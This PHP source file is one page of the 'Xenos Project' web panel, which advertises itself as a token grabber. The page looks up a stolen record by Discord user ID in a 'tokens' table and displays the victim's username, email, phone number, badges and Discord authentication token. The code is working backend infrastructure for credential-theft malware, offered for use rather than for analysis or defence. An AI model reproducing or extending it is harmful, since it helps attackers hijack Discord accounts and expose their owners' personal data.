<?php

    require_once('Inc/fonctions.php');

    if(!CheckLogin()){
        header('Location: login');
    }


    if(isset($_GET['id']) && !empty($_GET['id'])) {
        if(strlen($_GET['id']) == 18) {
            global $bdd;

            $req = $bdd->prepare('SELECT * FROM tokens WHERE `user_id` = ?');
            $req->execute(array(htmlspecialchars($_GET['id'])));
            $user = $req->fetch();

        } else {
            header('Location: tokens'); die();
        }
    } else {
        header('Location: tokens'); die();
    }

?>

<!DOCTYPE html>
<html lang="en">
<head>

    <!-- Icon -->
    <link rel="shortcut icon" type="image/jpg" href="assets/images/logo.jpg"/>
    
    <!-- Reset Meta Tags -->
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Title -->
    <title>Xenos Project - Token</title>

    <!-- Css -->
    <link rel="stylesheet" href="assets/css/style.css">

    <!-- Javascript -->
    <script src="assets/js/d3.v3.min.js" charset="utf-8"></script>
</head>
<body>

    <!-- Navigation Bar -->
    <header>
        <nav>
            <a target="_blank" href="https://github.com/KanekiWeb" class="header_logo">
                <span>Xenos</span>
            </a>
            <div class="header_links">
                <ul class="nav_links">
                    <li class="nav_link"><a href="index">Acceuil</a></li>
                    <li class="nav_link"><a href="tokens">Tokens</a></li>
                </ul>
            </div>
        </nav>
    </header>

    <!-- Main -->
    <section class="section_main">
        <div class="main">
            <img src="assets/images/xenos.gif" alt="">
            <h1>Xenos Project</h1>
            <p>The Best Most powerfull token grabber with user interface.</p>
        </div>
    </section>

    <section class="section_zombie">
        <div id="zombie" class="zombie">
            <div class="user_infos">
            <img class="user_pfp" src="https://cdn.discordapp.com/avatars/<?=$user['user_id']?>/<?=$user['avatar']?>" alt="" srcset="">
                <div class="user_text_infos">
                    <span><?=$user['username']?> (<?=$user['user_id']?>)</span>
                    <p id="user_email"><?=$user['email']?></p>
                    <p><?=$user['phone']?></p>
                    <div class="badges">
                    <?php
                            if($user['badges'] == 1) {
                                echo '<img src="assets/badges/Staff.png" alt="" srcset="">';
                            }else if($user['badges'] == 2) {
                                echo '<img src="assets/badges/Partner.png" alt="" srcset="">';
                            }else if($user['badges'] == 4) {
                                echo '<img src="assets/badges/hypeSquad.png" alt="" srcset="">';
                            }else if($user['badges'] == 8) {
                                echo '<img src="assets/badges/BugHunter.png" alt="" srcset="">';
                            }else if($user['badges'] == 64) {
                                echo '<img src="assets/badges/Bravery.png" alt="" srcset="">';
                            }else if($user['badges'] == 128) {
                                echo '<img src="assets/badges/Brilliance.png" alt="" srcset="">';
                            }else if($user['badges'] == 256) {
                                echo '<img src="assets/badges/Balance.png" alt="" srcset="">';
                            }else if($user['badges'] == 512) {
                                echo '<img src="assets/badges/early.png" alt="" srcset="">';
                            }else if($user['badges'] == 131072) {
                                echo '<img src="assets/badges/dev.png" alt="" srcset="">';
                            }

                            if($user['nitro_badges'] == 1) {
                                echo '<img src="assets/badges/Nitro_cl.png" alt="" srcset="">';
                            }else if($user['nitro_badges'] == 2) {
                                echo '<img src="assets/badges/Nitro_cl.png" alt="" srcset="">';
                                echo '<img src="assets/badges/Nitro_Boost.png" alt="" srcset="">';
                            }
                        ?>
                    </div>
                </div>
            </div>
            <div class="personnals_infos">
                <div class="custom-input token-input">
                    <label>Token: </label>
                    <input id="user_token" disabled type="text" value="<?=$user['token']?>" class="select-input">
                </div>
            </div>
        </div>
    </section>

    <footer>
        Copyright ©️ Made By <a target="_blank" href="https://github.com/KanekiWeb">Kaneki Web</a>
    </footer>
</body>
</html>